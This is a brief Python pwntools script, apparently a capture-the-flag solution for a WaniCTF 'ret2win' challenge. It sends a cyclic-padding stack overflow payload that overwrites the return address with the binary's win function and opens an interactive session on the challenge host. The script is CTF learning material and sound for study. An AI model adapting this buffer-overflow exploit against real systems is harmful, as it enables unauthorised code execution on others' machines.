#!/usr/bin/env python3

from pwn import *

elf = ELF('./chall')
#io = process('./chall')
io = remote("ret2win-pwn.wanictf.org",9003)
payload=cyclic(40)+p64(elf.sym.win)
io.sendline(payload)
io.interactive() 

